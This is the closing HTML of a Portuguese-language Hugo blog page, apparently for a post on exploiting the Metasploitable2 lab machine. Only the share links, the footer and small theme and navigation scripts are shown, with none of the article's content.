target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on facebook" href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on whatsapp" href="https://api.whatsapp.com/send?text=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais%20-%20http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on telegram" href="https://telegram.me/share/url?text=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais&amp;url=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentcolor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share Exploração de vulnerabilidades em ambientes virtuais on ycombinator" href="https://news.ycombinator.com/submitlink?t=Explora%c3%a7%c3%a3o%20de%20vulnerabilidades%20em%20ambientes%20virtuais&u=http%3a%2f%2flocalhost%3a1313%2fblog%2f2024-08-11-exploracao-metasploitable2%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentcolor" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>Blog do GRIS</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>